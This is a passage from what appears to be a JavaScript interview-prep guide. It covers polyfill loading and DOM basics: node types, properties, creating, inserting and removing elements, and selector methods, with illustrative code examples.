 * Optional Polyfills:
 * 
 * - ResizeObserver (older browsers)
 * - Web Animations (IE11, old Safari)
 * - CustomEvent (IE9-11)
 * 
 * Browser Support Target:
 * > 0.5%, last 2 versions, not dead, IE 11
 */
```

**Performance Considerations:**

```javascript
// Measure polyfill loading impact
console.time('polyfills');
await loadPolyfills();
console.timeEnd('polyfills');

// Monitor bundle size
// Before polyfills: 50KB
// After polyfills: 120KB (+70KB)

// Consider CDN for polyfills
<script src="https://cdn.jsdelivr.net/npm/core-js-bundle@3.25.0/minified.js"></script>

// Or use differential serving
// - Modern bundle: 50KB (no polyfills)
// - Legacy bundle: 120KB (with polyfills)
// Modern browsers get smaller bundle
```

**Alternatives to Polyfills:**

```javascript
// 1. Progressive Enhancement
// Provide basic functionality without the feature
if ('IntersectionObserver' in window) {
  // Use lazy loading
  setupLazyLoading();
} else {
  // Load all images immediately
  loadAllImages();
}

// 2. Graceful Degradation
// Detect and inform users
if (!window.Promise) {
  showBrowserUpgradeMessage();
} else {
  initializeApp();
}

// 3. Feature-Based Loading
// Only load features browser supports
const features = detectFeatures();
loadComponents(features);
```

**When NOT to Use Polyfills:**

1. **Feature is purely aesthetic** - Don't polyfill for minor visual enhancements
2. **Polyfill is too large** - If polyfill adds 200KB, consider alternatives
3. **Feature has good fallback** - Use progressive enhancement instead
4. **Very few users affected** - If < 0.1% users, may not be worth it
5. **Security concerns** - Some polyfills may have vulnerabilities
6. **Performance impact** - If polyfill significantly slows down app

**Summary:**

Polyfills are essential for:
- Supporting older browsers while using modern features
- Ensuring consistent behavior across browsers
- Enabling progressive enhancement strategies
- Maintaining backward compatibility

Use them wisely by:
- Loading conditionally based on feature detection
- Choosing lightweight, well-maintained libraries
- Monitoring bundle size impact
- Testing both with and without polyfills
- Documenting requirements and browser support targets


# JavaScript and the DOM (84-88)

## 84. What is the Document Object Model (DOM)?

The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page structure as a tree of objects that can be manipulated with JavaScript, allowing you to dynamically change the document's structure, style, and content.

**Key Concepts:**

**1. Tree Structure:**

The DOM represents documents as a hierarchical tree of nodes:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>My Page</title>
  </head>
  <body>
    <h1>Welcome</h1>
    <p>Hello World</p>
  </body>
</html>
```

```
Document
  └─ html (Element Node)
      ├─ head (Element Node)
      │   └─ title (Element Node)
      │       └─ "My Page" (Text Node)
      └─ body (Element Node)
          ├─ h1 (Element Node)
          │   └─ "Welcome" (Text Node)
          └─ p (Element Node)
              └─ "Hello World" (Text Node)
```

**2. Node Types:**

The DOM consists of different types of nodes:

```javascript
// Element Node (type 1) - HTML elements
const div = document.createElement('div');
console.log(div.nodeType); // 1
console.log(div.nodeName); // "DIV"

// Text Node (type 3) - Text content
const text = document.createTextNode('Hello');
console.log(text.nodeType); // 3
console.log(text.nodeName); // "#text"

// Comment Node (type 8) - HTML comments
const comment = document.createComment('This is a comment');
console.log(comment.nodeType); // 8
console.log(comment.nodeName); // "#comment"

// Document Node (type 9) - The document itself
console.log(document.nodeType); // 9
console.log(document.nodeName); // "#document"

// Attribute Node (deprecated but still exists)
// Now accessed via Element.attributes
```

**3. DOM Properties and Methods:**

```javascript
// Accessing the document
console.log(document.documentElement); // <html> element
console.log(document.head); // <head> element
console.log(document.body); // <body> element
console.log(document.title); // Page title

// Document information
console.log(document.URL); // Full URL
console.log(document.domain); // Domain name
console.log(document.referrer); // Referring URL
console.log(document.lastModified); // Last modification date

// Document state
console.log(document.readyState); // 'loading', 'interactive', or 'complete'
```

**4. Element Properties:**

```javascript
const element = document.querySelector('.my-element');

// Content properties
console.log(element.innerHTML); // HTML content including tags
console.log(element.textContent); // Text content only
console.log(element.innerText); // Visible text only

// Structure properties
console.log(element.tagName); // Tag name in uppercase
console.log(element.id); // Element ID
console.log(element.className); // CSS classes (string)
console.log(element.classList); // CSS classes (DOMTokenList)

// Hierarchy properties
console.log(element.parentNode); // Parent node
console.log(element.parentElement); // Parent element
console.log(element.childNodes); // All child nodes (NodeList)
console.log(element.children); // Child elements only (HTMLCollection)
console.log(element.firstChild); // First child node
console.log(element.firstElementChild); // First child element
console.log(element.lastChild); // Last child node
console.log(element.lastElementChild); // Last child element
console.log(element.nextSibling); // Next sibling node
console.log(element.nextElementSibling); // Next sibling element
console.log(element.previousSibling); // Previous sibling node
console.log(element.previousElementSibling); // Previous sibling element
```

**5. Attributes:**

```javascript
const element = document.querySelector('img');

// Get attributes
console.log(element.getAttribute('src'));
console.log(element.getAttribute('alt'));

// Set attributes
element.setAttribute('src', 'new-image.jpg');
element.setAttribute('alt', 'New description');

// Remove attributes
element.removeAttribute('title');

// Check if attribute exists
console.log(element.hasAttribute('src')); // true

// Get all attributes
const attrs = element.attributes;
for (let attr of attrs) {
  console.log(`${attr.name}: ${attr.value}`);
}

// Direct property access (for standard attributes)
element.src = 'image.jpg';
element.alt = 'Description';
element.id = 'myImage';
element.className = 'img-responsive';

// Data attributes
element.setAttribute('data-user-id', '123');
console.log(element.dataset.userId); // '123' (camelCase conversion)
element.dataset.userName = 'John';
console.log(element.getAttribute('data-user-name')); // 'John'
```

**6. Styles:**

```javascript
const element = document.querySelector('.box');

// Inline styles (CSS properties in camelCase)
element.style.backgroundColor = 'red';
element.style.fontSize = '20px';
element.style.marginTop = '10px';

// Multiple styles
element.style.cssText = 'background-color: blue; color: white; padding: 10px;';

// Get computed styles (including CSS from stylesheets)
const styles = window.getComputedStyle(element);
console.log(styles.backgroundColor); // Computed background color
console.log(styles.width); // Computed width
console.log(styles.getPropertyValue('font-size')); // Alternative syntax
```

**7. Classes:**

```javascript
const element = document.querySelector('.menu');

// classList API (modern, preferred)
element.classList.add('active');
element.classList.add('visible', 'highlighted'); // Multiple classes
element.classList.remove('hidden');
element.classList.toggle('open'); // Add if absent, remove if present
element.classList.toggle('special', true); // Force add
element.classList.replace('old-class', 'new-class');
console.log(element.classList.contains('active')); // true

// className (string manipulation, older approach)
element.className = 'menu active'; // Replace all classes
element.className += ' highlighted'; // Add class (note the space)
```

**8. DOM Events:**

```javascript
const button = document.querySelector('button');

// Add event listener
button.addEventListener('click', function(event) {
  console.log('Button clicked!');
  console.log('Event type:', event.type);
  console.log('Target element:', event.target);
  console.log('Current target:', event.currentTarget);
});

// Event with options
button.addEventListener('click', handler, {
  once: true,      // Remove after first trigger
  capture: false,  // Use bubbling phase
  passive: true    // Won't call preventDefault()
});

// Remove event listener
function handler() {
  console.log('Clicked');
}
button.addEventListener('click', handler);
button.removeEventListener('click', handler);

// Event delegation
document.querySelector('.list').addEventListener('click', function(event) {
  if (event.target.matches('li')) {
    console.log('List item clicked:', event.target.textContent);
  }
});
```

**9. DOM Traversal:**

```javascript
const element = document.querySelector('.current');

// Moving up
console.log(element.parentNode);
console.log(element.parentElement);
console.log(element.closest('.container')); // Nearest ancestor matching selector

// Moving down
console.log(element.children); // Direct children (elements only)
console.log(element.childNodes); // All child nodes
console.log(element.querySelector('.child')); // First matching descendant
console.log(element.querySelectorAll('.child')); // All matching descendants

// Moving sideways
console.log(element.nextElementSibling);
console.log(element.previousElementSibling);

// Complex traversal
function getAllSiblings(element) {
  const siblings = [];
  let sibling = element.parentElement.firstElementChild;
  
  while (sibling) {
    if (sibling !== element) {
      siblings.push(sibling);
    }
    sibling = sibling.nextElementSibling;
  }
  
  return siblings;
}
```

**10. DOM Dimensions and Position:**

```javascript
const element = document.querySelector('.box');

// Size (including padding, excluding margin and border)
console.log(element.clientWidth);
console.log(element.clientHeight);

// Size (including padding and border)
console.log(element.offsetWidth);
console.log(element.offsetHeight);

// Size (including padding, border, and scrollbar)
console.log(element.scrollWidth);
console.log(element.scrollHeight);

// Position relative to offset parent
console.log(element.offsetLeft);
console.log(element.offsetTop);
console.log(element.offsetParent);

// Scroll position
console.log(element.scrollLeft);
console.log(element.scrollTop);

// Bounding rectangle (position relative to viewport)
const rect = element.getBoundingClientRect();
console.log(rect.top, rect.right, rect.bottom, rect.left);
console.log(rect.width, rect.height);
console.log(rect.x, rect.y); // Same as left and top
```

**Real-World Example:**

```javascript
// Building a simple todo list with DOM manipulation
class TodoList {
  constructor(containerId) {
    this.container = document.getElementById(containerId);
    this.todos = [];
    this.render();
  }
  
  addTodo(text) {
    const todo = {
      id: Date.now(),
      text: text,
      completed: false
    };
    
    this.todos.push(todo);
    this.render();
  }
  
  toggleTodo(id) {
    const todo = this.todos.find(t => t.id === id);
    if (todo) {
      todo.completed = !todo.completed;
      this.render();
    }
  }
  
  deleteTodo(id) {
    this.todos = this.todos.filter(t => t.id !== id);
    this.render();
  }
  
  render() {
    // Clear container
    this.container.innerHTML = '';
    
    // Create list
    const ul = document.createElement('ul');
    ul.className = 'todo-list';
    
    // Add todos
    this.todos.forEach(todo => {
      const li = document.createElement('li');
      li.className = todo.completed ? 'completed' : '';
      li.setAttribute('data-id', todo.id);
      
      const checkbox = document.createElement('input');
      checkbox.type = 'checkbox';
      checkbox.checked = todo.completed;
      checkbox.addEventListener('change', () => this.toggleTodo(todo.id));
      
      const text = document.createElement('span');
      text.textContent = todo.text;
      
      const deleteBtn = document.createElement('button');
      deleteBtn.textContent = 'Delete';
      deleteBtn.addEventListener('click', () => this.deleteTodo(todo.id));
      
      li.appendChild(checkbox);
      li.appendChild(text);
      li.appendChild(deleteBtn);
      ul.appendChild(li);
    });
    
    this.container.appendChild(ul);
  }
}

// Usage
const todoList = new TodoList('todo-container');
todoList.addTodo('Learn JavaScript');
todoList.addTodo('Master the DOM');
```

**DOM vs Virtual DOM:**

```javascript
// Traditional DOM manipulation (can be slow with many updates)
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  document.body.appendChild(div); // Each append triggers reflow
}

// Better approach - batch updates
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  fragment.appendChild(div);
}
document.body.appendChild(fragment); // Single reflow

// Virtual DOM (React example) - framework handles optimization
function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>{todo.text}</li>
      ))}
    </ul>
  );
}
```

**Browser Rendering Process:**

```javascript
// Understanding how DOM changes affect rendering

// 1. DOM Tree - Structure of the page
// 2. CSSOM Tree - Styles applied
// 3. Render Tree - Combines DOM + CSSOM
// 4. Layout (Reflow) - Calculate positions and sizes
// 5. Paint - Draw pixels on screen
// 6. Composite - Combine layers

// Operations that trigger reflow (expensive):
element.offsetWidth; // Reading layout properties
element.style.width = '100px'; // Changing layout properties
element.classList.add('new-class'); // If affects layout

// Operations that only trigger repaint (less expensive):
element.style.color = 'red';
element.style.backgroundColor = 'blue';

// Optimizing DOM operations
// ❌ Bad - multiple reflows
element.style.width = '100px';
element.style.height = '100px';
element.style.margin = '10px';

// ✅ Good - single reflow
element.style.cssText = 'width: 100px; height: 100px; margin: 10px;';

// Or use classes
element.classList.add('resized');
```

**Key Takeaways:**

1. **DOM is an API** - Interface to interact with HTML documents
2. **Tree structure** - Hierarchical organization of nodes
3. **Live collection** - DOM updates reflect immediately in the page
4. **Cross-browser** - Standardized API works in all modern browsers
5. **Performance matters** - Minimize reflows and repaints
6. **Event-driven** - Interact with user actions through events



## 85. How do you create, append, or remove an element from the DOM?

DOM manipulation allows you to dynamically create, modify, and remove elements. Here are comprehensive methods for each operation:

**Creating Elements:**

**1. createElement() - Most Common Method:**

```javascript
// Create an element
const div = document.createElement('div');
const paragraph = document.createElement('p');
const button = document.createElement('button');
const image = document.createElement('img');

// Set properties
div.id = 'myDiv';
div.className = 'container';
paragraph.textContent = 'Hello World';
button.textContent = 'Click Me';
image.src = 'photo.jpg';
image.alt = 'Description';

// Set attributes
div.setAttribute('data-role', 'main');
button.setAttribute('type', 'button');

// Add styles
div.style.backgroundColor = 'lightblue';
div.style.padding = '20px';
```

**2. createTextNode() - Create Text Nodes:**

```javascript
// Create text node
const textNode = document.createTextNode('This is plain text');

// Create element and add text
const paragraph = document.createElement('p');
paragraph.appendChild(textNode);
```

**3. createDocumentFragment() - Efficient Batch Creation:**

```javascript
// Create fragment (not part of DOM tree initially)
const fragment = document.createDocumentFragment();

// Add multiple elements to fragment
for (let i = 0; i < 100; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  fragment.appendChild(li);
}

// Single DOM insertion (better performance)
document.querySelector('ul').appendChild(fragment);
```

**4. cloneNode() - Clone Existing Elements:**

```javascript
const original = document.querySelector('.template');

// Shallow clone (element only, no children)
const shallowClone = original.cloneNode(false);

// Deep clone (element with all descendants)
const deepClone = original.cloneNode(true);

// Modify and append clone
deepClone.id = 'clone-1';
deepClone.textContent = 'Cloned content';
document.body.appendChild(deepClone);
```

**5. innerHTML (String-based Creation):**

```javascript
// Create elements from HTML string
const container = document.createElement('div');
container.innerHTML = `
  <h2>Title</h2>
  <p>Paragraph text</p>
  <button class="btn">Click</button>
`;

// ⚠️ Warning: innerHTML can be unsafe with user input
// Always sanitize user data
const userInput = getUserInput();
const sanitized = DOMPurify.sanitize(userInput); // Use a library
container.innerHTML = sanitized;
```

**Appending Elements:**

**1. appendChild() - Add as Last Child:**

```javascript
const parent = document.querySelector('.parent');
const child = document.createElement('div');
child.textContent = 'New child';

// Add as last child
parent.appendChild(child);

// Move existing element (removes from old position)
const existingElement = document.querySelector('.move-me');
parent.appendChild(existingElement);
```

**2. append() - Modern Method (Multiple Nodes):**

```javascript
const parent = document.querySelector('.parent');

// Append multiple nodes at once
parent.append(
  document.createElement('div'),
  'Text node',
  document.createElement('span')
);

// Can mix elements and strings
parent.append('Hello ', document.createElement('strong'), ' World');
```

**3. prepend() - Add as First Child:**

```javascript
const parent = document.querySelector('.parent');
const child = document.createElement('div');

// Add as first child
parent.prepend(child);

// Multiple elements
parent.prepend(
  document.createElement('header'),
  document.createElement('nav')
);
```

**4. insertBefore() - Insert Before Specific Element:**

```javascript
const parent = document.querySelector('.parent');
const newElement = document.createElement('div');
const referenceElement = document.querySelector('.reference');

// Insert newElement before referenceElement
parent.insertBefore(newElement, referenceElement);

// Insert as first child (before first child)
parent.insertBefore(newElement, parent.firstChild);
```

**5. insertAdjacentElement() - Flexible Positioning:**

```javascript
const reference = document.querySelector('.reference');
const newElement = document.createElement('div');

// Four positions:
// 'beforebegin' - Before the element itself
reference.insertAdjacentElement('beforebegin', newElement);

// 'afterbegin' - First child of the element
reference.insertAdjacentElement('afterbegin', newElement);

// 'beforeend' - Last child of the element
reference.insertAdjacentElement('beforeend', newElement);

// 'afterend' - After the element itself
reference.insertAdjacentElement('afterend', newElement);
```

**6. insertAdjacentHTML() - Insert HTML String:**

```javascript
const element = document.querySelector('.target');

// Insert HTML at different positions
element.insertAdjacentHTML('beforebegin', '<div>Before</div>');
element.insertAdjacentHTML('afterbegin', '<p>Start of content</p>');
element.insertAdjacentHTML('beforeend', '<p>End of content</p>');
element.insertAdjacentHTML('afterend', '<div>After</div>');
```

**7. after() and before() - Modern Methods:**

```javascript
const element = document.querySelector('.target');

// Insert after element
element.after(
  document.createElement('div'),
  'Text content'
);

// Insert before element
element.before(
  document.createElement('header'),
  document.createElement('nav')
);
```

**Removing Elements:**

**1. remove() - Modern Method (Simplest):**

```javascript
const element = document.querySelector('.to-remove');

// Remove element from DOM
element.remove();

// Remove multiple elements
document.querySelectorAll('.temp').forEach(el => el.remove());
```

**2. removeChild() - Traditional Method:**

```javascript
const parent = document.querySelector('.parent');
const child = document.querySelector('.child');

// Remove specific child
parent.removeChild(child);

// Remove first child
if (parent.firstChild) {
  parent.removeChild(parent.firstChild);
}

// Remove last child
if (parent.lastChild) {
  parent.removeChild(parent.lastChild);
}
```

**3. Remove All Children:**

```javascript
const parent = document.querySelector('.parent');

// Method 1: innerHTML (fastest but loses event listeners)
parent.innerHTML = '';

// Method 2: textContent (also fast, same caveat)
parent.textContent = '';

// Method 3: replaceChildren() - modern, clean
parent.replaceChildren();

// Method 4: Loop with removeChild (preserves cleanup)
while (parent.firstChild) {
  parent.removeChild(parent.firstChild);
}

// Method 5: Loop with remove()
parent.childNodes.forEach(child => child.remove());
```

**4. replaceChild() - Replace Element:**

```javascript
const parent = document.querySelector('.parent');
const oldElement = document.querySelector('.old');
const newElement = document.createElement('div');
newElement.textContent = 'New content';

// Replace old with new
parent.replaceChild(newElement, oldElement);
```

**5. replaceWith() - Modern Replacement:**

```javascript
const oldElement = document.querySelector('.old');
const newElement = document.createElement('div');

// Replace element
oldElement.replaceWith(newElement);

// Replace with multiple nodes
oldElement.replaceWith(
  document.createElement('header'),
  'Text',
  document.createElement('footer')
);
```

**Real-World Examples:**

**1. Building a Dynamic List:**

```javascript
function createTodoList(items) {
  // Create container
  const ul = document.createElement('ul');
  ul.className = 'todo-list';
  
  // Create fragment for performance
  const fragment = document.createDocumentFragment();
  
  // Add items
  items.forEach(item => {
    const li = document.createElement('li');
    
    // Checkbox
    const checkbox = document.createElement('input');
    checkbox.type = 'checkbox';
    checkbox.checked = item.completed;
    checkbox.addEventListener('change', () => toggleTodo(item.id));
    
    // Text
    const span = document.createElement('span');
    span.textContent = item.text;
    if (item.completed) {
      span.style.textDecoration = 'line-through';
    }
    
    // Delete button
    const deleteBtn = document.createElement('button');
    deleteBtn.textContent = '×';
    deleteBtn.className = 'delete-btn';
    deleteBtn.addEventListener('click', () => deleteTodo(item.id));
    
    // Assemble
    li.appendChild(checkbox);
    li.appendChild(span);
    li.appendChild(deleteBtn);
    fragment.appendChild(li);
  });
  
  ul.appendChild(fragment);
  return ul;
}

// Usage
const todos = [
  { id: 1, text: 'Learn DOM', completed: false },
  { id: 2, text: 'Build project', completed: false }
];

const list = createTodoList(todos);
document.querySelector('.container').appendChild(list);
```

**2. Creating a Card Component:**

```javascript
function createCard(data) {
  // Create card structure
  const card = document.createElement('div');
  card.className = 'card';
  card.setAttribute('data-id', data.id);
  
  // Card image
  const img = document.createElement('img');
  img.src = data.image;
  img.alt = data.title;
  img.className = 'card-img';
  
  // Card body
  const body = document.createElement('div');
  body.className = 'card-body';
  
  // Title
  const title = document.createElement('h3');
  title.className = 'card-title';
  title.textContent = data.title;
  
  // Description
  const description = document.createElement('p');
  description.className = 'card-description';
  description.textContent = data.description;
  
  // Button
  const button = document.createElement('button');
  button.className = 'btn btn-primary';
  button.textContent = 'Learn More';
  button.addEventListener('click', () => showDetails(data.id));
  
  // Assemble card
  body.append(title, description, button);
  card.append(img, body);
  
  return card;
}

// Usage
const cardData = {
  id: 1,
  image: 'product.jpg',
  title: 'Product Name',
  description: 'Product description here'
};

const card = createCard(cardData);
document.querySelector('.products').appendChild(card);
```

**3. Table Generation:**

```javascript
function createTable(data) {
  const table = document.createElement('table');
  table.className = 'data-table';
  
  // Create thead
  const thead = document.createElement('thead');
  const headerRow = document.createElement('tr');
  
  // Get headers from first object
  const headers = Object.keys(data[0]);
  headers.forEach(header => {
    const th = document.createElement('th');
    th.textContent = header.charAt(0).toUpperCase() + header.slice(1);
    headerRow.appendChild(th);
  });
  
  thead.appendChild(headerRow);
  
  // Create tbody
  const tbody = document.createElement('tbody');
  
  data.forEach(row => {
    const tr = document.createElement('tr');
    
    headers.forEach(header => {
      const td = document.createElement('td');
      td.textContent = row[header];
      tr.appendChild(td);
    });
    
    tbody.appendChild(tr);
  });
  
  // Assemble table
  table.appendChild(thead);
  table.appendChild(tbody);
  
  return table;
}

// Usage
const tableData = [
  { name: 'John', age: 30, city: 'New York' },
  { name: 'Jane', age: 25, city: 'London' },
  { name: 'Bob', age: 35, city: 'Paris' }
];

const table = createTable(tableData);
document.querySelector('.table-container').appendChild(table);
```

**4. Modal Creation and Removal:**

```javascript
function showModal(title, content) {
  // Create modal structure
  const modal = document.createElement('div');
  modal.className = 'modal';
  modal.id = 'dynamic-modal';
  
  const modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  
  // Close button
  const closeBtn = document.createElement('button');
  closeBtn.className = 'modal-close';
  closeBtn.textContent = '×';
  closeBtn.addEventListener('click', () => closeModal());
  
  // Title
  const modalTitle = document.createElement('h2');
  modalTitle.textContent = title;
  
  // Content
  const modalBody = document.createElement('div');
  modalBody.className = 'modal-body';
  modalBody.innerHTML = content; // Or use textContent for safety
  
  // Assemble modal
  modalContent.append(closeBtn, modalTitle, modalBody);
  modal.appendChild(modalContent);
  
  // Add to page
  document.body.appendChild(modal);
  
  // Backdrop click to close
  modal.addEventListener('click', (e) => {
    if (e.target === modal) {
      closeModal();
    }
  });
  
  // Show with animation
  setTimeout(() => modal.classList.add('show'), 10);
}

function closeModal() {
  const modal = document.getElementById('dynamic-modal');
  if (modal) {
    modal.classList.remove('show');
    setTimeout(() => modal.remove(), 300); // Remove after animation
  }
}

// Usage
showModal('Welcome', '<p>This is a dynamic modal!</p>');
```

**5. Drag and Drop List Reordering:**

```javascript
function createDraggableList(items) {
  const ul = document.createElement('ul');
  ul.className = 'draggable-list';
  
  items.forEach((item, index) => {
    const li = document.createElement('li');
    li.textContent = item;
    li.draggable = true;
    li.setAttribute('data-index', index);
    
    // Drag events
    li.addEventListener('dragstart', handleDragStart);
    li.addEventListener('dragover', handleDragOver);
    li.addEventListener('drop', handleDrop);
    li.addEventListener('dragend', handleDragEnd);
    
    ul.appendChild(li);
  });
  
  return ul;
}

let draggedElement = null;

function handleDragStart(e) {
  draggedElement = this;
  this.classList.add('dragging');
  e.dataTransfer.effectAllowed = 'move';
}

function handleDragOver(e) {
  if (e.preventDefault) {
    e.preventDefault();
  }
  e.dataTransfer.dropEffect = 'move';
  return false;
}

function handleDrop(e) {
  if (e.stopPropagation) {
    e.stopPropagation();
  }
  
  if (draggedElement !== this) {
    // Reorder elements
    const parent = this.parentNode;
    const allItems = [...parent.children];
    const draggedIndex = allItems.indexOf(draggedElement);
    const targetIndex = allItems.indexOf(this);
    
    if (draggedIndex < targetIndex) {
      parent.insertBefore(draggedElement, this.nextSibling);
    } else {
      parent.insertBefore(draggedElement, this);
    }
  }
  
  return false;
}

function handleDragEnd(e) {
  this.classList.remove('dragging');
  document.querySelectorAll('.draggable-list li').forEach(li => {
    li.classList.remove('over');
  });
}

// Usage
const items = ['Item 1', 'Item 2', 'Item 3', 'Item 4'];
const list = createDraggableList(items);
document.querySelector('.container').appendChild(list);
```

**Performance Best Practices:**

```javascript
// ❌ Bad - Multiple reflows
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  document.body.appendChild(div); // Reflow on each append
}

// ✅ Good - Single reflow with fragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  fragment.appendChild(div);
}
document.body.appendChild(fragment); // Single reflow

// ✅ Good - Batch with innerHTML (if no event listeners needed)
const html = Array.from({ length: 1000 }, (_, i) => 
  `<div>Item ${i}</div>`
).join('');
document.body.innerHTML += html;

// ❌ Bad - Reading and writing layout properties
element.style.width = element.offsetWidth + 10 + 'px'; // Forces reflow

// ✅ Good - Batch reads and writes
const width = element.offsetWidth; // Read
element.style.width = width + 10 + 'px'; // Write
```

**Common Pitfalls:**

```javascript
// 1. Event listeners on removed elements
const button = document.createElement('button');
button.addEventListener('click', handleClick);
document.body.appendChild(button);
button.remove(); // Event listener still in memory if handleClick has closure

// Solution: Remove listeners before removing elements
button.removeEventListener('click', handleClick);
button.remove();

// 2. innerHTML with event listeners
const parent = document.querySelector('.parent');
parent.innerHTML = '<button onclick="alert()">Click</button>'; // Works
parent.innerHTML = ''; // Loses all event listeners on children

// 3. Live vs Static collections
const divs = document.getElementsByTagName('div'); // Live
const moreDivs = document.querySelectorAll('div'); // Static

document.body.appendChild(document.createElement('div'));
console.log(divs.length); // Increases (live collection)
console.log(moreDivs.length); // Stays same (static snapshot)

// 4. Modifying arrays while iterating
const items = document.querySelectorAll('.item');
items.forEach(item => {
  if (condition) {
    item.remove(); // Safe with querySelectorAll (static)
  }
});

const liveItems = document.getElementsByClassName('item');
// ❌ Bad - collection changes during iteration
for (let i = 0; i < liveItems.length; i++) {
  liveItems[i].remove(); // Skips elements!
}

// ✅ Good - iterate backwards or convert to array
for (let i = liveItems.length - 1; i >= 0; i--) {
  liveItems[i].remove();
}
// Or
[...liveItems].forEach(item => item.remove());
```

**Memory Management:**

```javascript
// Clean up to prevent memory leaks
class Component {
  constructor() {
    this.element = document.createElement('div');
    this.handleClick = this.handleClick.bind(this);
    this.element.addEventListener('click', this.handleClick);
  }
  
  handleClick() {
    console.log('Clicked');
  }
  
  destroy() {
    // Remove event listeners
    this.element.removeEventListener('click', this.handleClick);
    
    // Remove from DOM
    this.element.remove();
    
    // Clear references
    this.element = null;
    this.handleClick = null;
  }
}

// Usage
const component = new Component();
document.body.appendChild(component.element);

// Later, clean up
component.destroy();
```



## 86. Describe different ways to find or access HTML elements in the DOM.

There are multiple methods to select and access HTML elements in the DOM, each with different use cases and performance characteristics.

**Modern Methods (Recommended):**

**1. querySelector() - First Matching Element:**

```javascript
// Select first element matching CSS selector
const element = document.querySelector('.my-class');
const byId = document.querySelector('#my-id');
const byTag = document.querySelector('div');
const complex = document.querySelector('div.container > p:first-child');

// Works on any element, not just document
const parent = document.querySelector('.parent');
const child = parent.querySelector('.child');

// Returns null if not found
const notFound = document.querySelector('.does-not-exist');
console.log(notFound); // null

// Advanced selectors
const input = document.querySelector('input[type="email"]');
const checked = document.querySelector('input:checked');
const disabled = document.querySelector('button:disabled');
const nthChild = document.querySelector('li:nth-child(3)');
const dataAttr = document.querySelector('[data-role="main"]');
```

**2. querySelectorAll() - All Matching Elements:**

```javascript
// Returns NodeList (static snapshot)
const elements = document.querySelectorAll('.item');
console.log(elements.length);

// Iterate with forEach (NodeList has forEach)
elements.forEach(element => {
  console.log(element.textContent);
});

// Convert to array for array methods
const array = Array.from(elements);
const filtered = array.filter(el => el.classList.contains('active'));

// Or use spread operator
const arr = [...elements];

// Multiple selectors (comma-separated)
const multiple = document.querySelectorAll('.class1, .class2, #id1');

// Complex selectors
const specific = document.querySelectorAll('div.container > p.highlighted');
const notSelector = document.querySelectorAll('li:not(.excluded)');
const attributes = document.querySelectorAll('[data-active="true"]');

// Returns empty NodeList if nothing found
const empty = document.querySelectorAll('.nothing');
console.log(empty.length); // 0
```

**Classic Methods:**

**3. getElementById() - Single Element by ID:**

```javascript
// Fastest method for ID lookup
const element = document.getElementById('my-id');

// No '#' prefix needed
// ❌ Wrong
const wrong = document.getElementById('#my-id');

// ✅ Correct
const correct = document.getElementById('my-id');

// Returns null if not found
const notFound = document.getElementById('nonexistent');

// Only available on document object
// ❌ This won't work
const parent = document.querySelector('.parent');
const child = parent.getElementById('child-id'); // Error!

// Note: IDs should be unique in valid HTML
```

**4. getElementsByClassName() - Live HTMLCollection:**

```javascript
// Returns live HTMLCollection
const elements = document.getElementsByClassName('my-class');

// Multiple classes (space-separated)
const multi = document.getElementsByClassName('class1 class2');

// Live collection - updates automatically
console.log(elements.length); // e.g., 3
document.body.appendChild(createElementWithClass('my-class'));
console.log(elements.length); // 4 (automatically updated)

// Can be called on any element
const parent = document.getElementById('container');
const children = parent.getElementsByClassName('child');

// Iterate (no forEach on HTMLCollection in older browsers)
for (let i = 0; i < elements.length; i++) {
  console.log(elements[i]);
}

// Or convert to array
Array.from(elements).forEach(el => {
  console.log(el);
});

// Access by index
const first = elements[0];
const second = elements[1];
```

**5. getElementsByTagName() - Live HTMLCollection by Tag:**

```javascript
// Get all elements of a specific tag
const divs = document.getElementsByTagName('div');
const paragraphs = document.getElementsByTagName('p');
const images = document.getElementsByTagName('img');

// Get all elements
const allElements = document.getElementsByTagName('*');

// Live collection
console.log(divs.length);
document.body.appendChild(document.createElement('div'));
console.log(divs.length); // Increased by 1

// Scoped to an element
const container = document.getElementById('container');
const containerDivs = container.getElementsByTagName('div');

// Case-insensitive in HTML documents
const upper = document.getElementsByTagName('DIV');
const lower = document.getElementsByTagName('div');
// Both return the same elements
```

**6. getElementsByName() - Elements by Name Attribute:**

```javascript
// Useful for form elements
const radios = document.getElementsByName('gender');
const inputs = document.getElementsByName('username');

// Returns live NodeList
console.log(radios.length);

// Iterate
radios.forEach(radio => {
  if (radio.checked) {
    console.log('Selected:', radio.value);
  }
});

// Common use case: radio buttons
function getSelectedRadio(name) {
  const radios = document.getElementsByName(name);
  for (let radio of radios) {
    if (radio.checked) {
      return radio.value;
    }
  }
  return null;
}

const selected = getSelectedRadio('payment-method');
```

**Relationship-Based Selection:**

**7. Parent, Child, and Sibling Access:**

```javascript
const element = document.querySelector('.current');

// Parent relationships
console.log(element.parentNode); // Immediate parent (any node)
console.log(element.parentElement); // Immediate parent (element only)

// Closest ancestor matching selector
const container = element.closest('.container');
const form = element.closest('form');
const body = element.closest('body');

// Children relationships
console.log(element.children); // HTMLCollection of child elements
console.log(element.childNodes); // NodeList of all child nodes (includes text nodes)
console.log(element.firstChild); // First child node
console.log(element.firstElementChild); // First child element
console.log(element.lastChild); // Last child node
console.log(element.lastElementChild); // Last child element
console.log(element.childElementCount); // Number of child elements

// Sibling relationships
console.log(element.nextSibling); // Next sibling node
console.log(element.nextElementSibling); // Next sibling element
console.log(element.previousSibling); // Previous sibling node
console.log(element.previousElementSibling); // Previous sibling element
```

**8. closest() - Find Nearest Ancestor:**

```javascript
const button = document.querySelector('.delete-btn');

// Find nearest parent with specific selector
const card = button.closest('.card');
const container = button.closest('.container');
const form = button.closest('form');

// Can match the element itself
const self = button.closest('.delete-btn'); // Returns button

// Returns null if no match
const notFound = button.closest('.nonexistent');

// Use case: Event delegation
document.querySelector('.list').addEventListener('click', (e) => {
  const item = e.target.closest('.list-item');
  if (item) {
    console.log('Clicked item:', item.dataset.id);
  }
});
```

